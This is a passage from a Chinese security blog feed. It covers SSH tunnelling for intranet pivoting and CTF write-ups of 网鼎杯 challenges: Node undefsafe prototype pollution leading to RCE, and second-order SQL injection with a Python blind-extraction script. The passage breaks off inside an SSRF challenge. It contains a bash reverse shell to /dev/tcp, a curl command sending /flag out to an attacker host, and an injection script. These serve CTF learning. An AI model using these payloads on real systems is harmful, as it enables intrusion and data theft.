href="https://www.cnblogs.com/sfsec/p/15534100.html">https://www.cnblogs.com/sfsec/p/15534100.html</a></p><p>在内网中几乎所有的Linux服务器都支持SSH协议，所以SSH隧道也是一种非常常见的隧道技术</p><p>一般我们利用SSH客户端去连接服务端命令如下</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh root@192.168.1.1<br></code></pre></td></tr></table></figure><p>下面是搭建SSH隧道常用的参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-f：后台运行ssh<br>-N：安静的建立连接（可以建立连接且看不到会话）<br>-C：压缩传输，提高传输速度<br>-g：允许远程主机连接本地用于转发的端口<br>-L：本地端口转发<br>-R：远程端口转发<br>-D：动态转发<br>-p：指定ssh端口<br></code></pre></td></tr></table></figure><p><strong>本地转发</strong></p><p>借助文章的网络拓扑图</p><p><img src="http://cdn.clown2024.cn/202407151711917.png" alt="image-20240424232040689"></p><p>现在的情形就是攻击者能够访问到target1但是访问不到target2，那么我们就利用target1为跳板机，将target2上的流量转发到跳板机上，比如这里转发target2的端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ssh -CfNg -L (本地端口):(目标主机ip):(目标主机端口) (跳板机用户名)@(跳板机ip) -p (跳板机端口)</span><br>ssh -CfNg -L 6666:192.168.239.129:22 root@192.168.178.142  <br></code></pre></td></tr></table></figure><p>然后输入target1的密码即可</p><p>然后我们用ssh连接6666端口就可以成功连接到target2的ssh服务了</p><p>当靶机不出网做不了frp代理的时候可以用ssh隧道本地转发</p><p><strong>远程转发</strong></p><p>远程转发适用于外网访问不到内网设备，但是内网可以访问到本地的外网VPS设备。</p><p>这里以target1为跳板机，将kali的4444端口流量转发到target2的22端口上，然后访问kali的4444端口就可以到达target2的22端口：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh -CfNg -R 4444:192.168.239.129:22 root@192.168.178.128  #4444为kali外网VPS端口<br></code></pre></td></tr></table></figure><p>然后输入kali的账号密码即可</p><h2><span id="icmp隧道">ICMP隧道</span></h2><h3><span id="icmpsh工具">icmpsh工具</span></h3><p>这里用到一个icmpsh工具，GitHub地址：<a href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a></p><h3><span id="pingtunnel工具">pingTunnel工具</span></h3><p>项目地址：<a href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel</a></p><p>该工具做icmp隧道会较为方便</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nssctf刷题-网鼎杯</title>
      <link href="/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1><span id="网鼎杯-2020青龙组notes">[网鼎杯 2020青龙组]Notes</span></h1><p>这里没给题目源码只能网上找，app.js源码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure><p>大概审了一遍之后就会知道，在&#x2F;status路由里面执行了命令，只要能够污染commands里面的属性就能rce，接下来就要去看看怎么样才能污染这个属性。</p><p>看了一下只有undefsafe这个模块能够修改对象的属性，搜了一下该模块在低版本存在原型链污染漏洞，先来了解一下undefsafe模块</p><blockquote><p><code>undefsafe</code> 是一个用于安全地访问对象属性的库。它提供了一种安全的方法来访问嵌套在对象中的属性，而不会导致错误。这在处理可能不存在的属性时非常有用，因为它可以避免抛出异常，但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞。</p></blockquote><p>下面是几个例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">a</span>: &#123;<br>    <span class="hljs-attr">b</span>: &#123;<br>      <span class="hljs-attr">c</span>: <span class="hljs-number">3</span><br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">undefsafe</span>(obj, <span class="hljs-string">&#x27;a.b.c&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出：3</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">const</span> obj=&#123;<br>    <span class="hljs-attr">a</span>:&#123;<br>        <span class="hljs-attr">b</span>:&#123;<br>            <span class="hljs-attr">c</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>:<span class="hljs-number">2</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>));<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//报错</span><br><span class="hljs-title function_">undef</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//不存在该属性则创建，存在则修改</span><br></code></pre></td></tr></table></figure><p>下面是一个原型链污染的例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;rev1ve&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br></code></pre></td></tr></table></figure><p>这时候toString属性就被我们修改了，那么根据上面的代码他会将commands对象所有的属性列出来，那么我们就可以利用原型链添加一个我们想要的属性值即可。</p><p>能让我们足够自由传参数的污染的函数就是edit_note()</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了该函数的位置就在&#x2F;edit_note路由</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><p>那我们只要控制id为__ proto __即可污染。</p><p>这里一开始传了参数发现会报错给我整不会了</p><p><img src="http://cdn.clown2024.cn/202407151704590.png" alt="image-20240320173335763"></p><p>去看了wp说报错也不影响。</p><p>那我就先试了一下污染成ls，但是没有回显</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=ls&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704591.png" alt="image-20240320173550096"></p><p>然后用了一下curl是能监听到的，那就可以直接反弹shell了</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">id=__proto__&amp;author=bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&amp;raw=hhh<br></code></pre></td></tr></table></figure><blockquote><p>难绷弹不回来不知道为什么，那就用curl吧。。。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">id=__proto__&amp;author=curl &lt;主机ip&gt; -d `cat /flag`&amp;raw=hhh<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704592.png" alt="image-20240320174451680"></p><p>参考文章：<a href="https://blog.csdn.net/m0_73512445/article/details/135079967">https://blog.csdn.net/m0_73512445/article/details/135079967</a></p><h1><span id="网鼎杯-2018unfinish">[网鼎杯 2018]unfinish</span></h1><p>这题的考点是二次注入，还不会二次注入先学习一下，参考文章：<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p><blockquote><p>总结一下就是二次利用恶意数据，第一次发送的恶意数据经过转义后存入数据库，但之后从数据取出数据利用的时候并没有转义，那这个时候我们的恶意数据就会生效。</p></blockquote><p>进去就给了一个login.php，扫了一下发现还有register.php</p><p><img src="http://cdn.clown2024.cn/202407151704593.png" alt="image-20240326000952219"></p><p>随便注册一个账号登录进去之后就是一张图片</p><p><img src="http://cdn.clown2024.cn/202407151704594.png" alt="image-20240326001047845"></p><p>可以看到上图的左侧中会回显一个用户名，这就是第二次利用数据库中的数据，那应该就是在注册的用户名上动手脚了</p><p>在注册页面的用户名输了一下逗号发现被过滤了</p><p><img src="http://cdn.clown2024.cn/202407151704595.png" alt="image-20240326002729728"></p><p>那我们就先去爆破一下看看过滤了什么关键词</p><p><img src="http://cdn.clown2024.cn/202407151704596.png" alt="image-20240326003157517"></p><p>看到似乎是只过滤了information和逗号</p><p>猜测一下sql语句如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">select username from table where username = &#x27;传递的参数&#x27;<br></code></pre></td></tr></table></figure><p>我们去注册一下用户名0’ and ‘1 看一下，可以发现用户名变成了0，即存在二次注入</p><p><img src="http://cdn.clown2024.cn/202407151704597.png" alt="image-20240328145045188"></p><p>这里可以了解一下MySQL中字符串的运算</p><p><img src="http://cdn.clown2024.cn/202407151704598.png" alt="image-20240328144630707"></p><p>执行select ‘0’+database()变成了0：</p><p><img src="http://cdn.clown2024.cn/202407151704599.png" alt="image-20240328144719610"></p><p>不过用下面的查询方式就能知道数据库名的第一个字符的ascii码</p><p><img src="http://cdn.clown2024.cn/202407151704600.png" alt="image-20240328144824861"></p><p>题中过滤了逗号可以用下面的方式</p><p><img src="http://cdn.clown2024.cn/202407151704601.png" alt="image-20240328144917362"></p><p>然后我们就可以进行盲注，因为过滤了information，所以wp猜测表名为flag，只能说很猜谜。</p><p>那脚本如下，因为邮箱不能重复注册，所以每次注册都要不一样（不想写了偷个懒）</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>():<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url = <span class="hljs-string">&#x27;&#x27;</span><br>    register_url = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    login_url = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        time.sleep(<span class="hljs-number">0.5</span>)<br>        register_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i),<br>                 <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        login_data = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&#123;&#125;@1.com&quot;</span>.<span class="hljs-built_in">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>&#125;<br>        requests.post(register_url, data=register_data)<br>        response_login = requests.post(login_url, data=login_data)<br>        bs = BeautifulSoup(response_login.text, <span class="hljs-string">&#x27;html.parser&#x27;</span>) <br>        username = bs.find(<span class="hljs-string">&#x27;span&#x27;</span>, class_=<span class="hljs-string">&#x27;user-name&#x27;</span>)  <span class="hljs-comment"># 取返回页面数据的span class=user-name属性</span><br>        number = username.text  <br>        flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(number))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\r&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(flag,end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    get_flag()<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151704602.png" alt="image-20240328150712672"></p><blockquote><p>不过还是觉得很奇怪，按照上面的查询语句不应该是为空嘛查询出来的值？</p><p>网上也没找到源码不清楚具体是怎么样的</p></blockquote><p>参考文章：<a href="https://juejin.cn/post/7158228802844229662#heading-1">https://juejin.cn/post/7158228802844229662#heading-1</a></p><h1><span id="网鼎杯-2020-玄武组ssrfme">[网鼎杯 2020 玄武组]SSRFMe</span></h1><p>题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_inner_ip</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$match_result</span>=<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="hljs-variable">$url</span>);<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$match_result</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-variable">$url_parse</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>    <span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)<br>    &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;url fomat error&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-variable">$hostname</span>=<span class="hljs-variable">$url_parse</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$ip</span>=<span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$hostname</span>);<br>    <span class="hljs-variable">$int_ip</span>=<span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-variable">$ip</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span class="hljs-variable">$int_ip</span>&gt;&gt;<span class="hljs-number">24</span> || <span class="hljs-title function_ invoke__">ip2long</span>(<span class="hljs-string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="hljs-number">24</span> == <span 